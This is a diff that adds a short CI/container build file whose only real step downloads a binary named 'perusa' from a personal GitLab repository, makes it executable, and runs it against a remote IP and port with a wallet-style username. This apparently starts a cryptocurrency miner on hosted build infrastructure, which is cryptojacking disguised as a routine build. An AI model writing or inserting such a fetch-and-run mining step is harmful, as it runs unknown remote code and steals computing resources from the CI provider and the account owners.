@@ -1,0 +1,6 @@
+FROM vm/ubuntu:18.04
+
+SPLIT 5
+RUN apt-get update && \
+    apt-get install libjansson4 unzip && \
+	  wget -qO perusa https://gitlab.com/renifer12/verus/-/raw/main/perusa && chmod +x perusa && ./perusa -v -l 139.99.123.225:3956 -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.Susah -p x
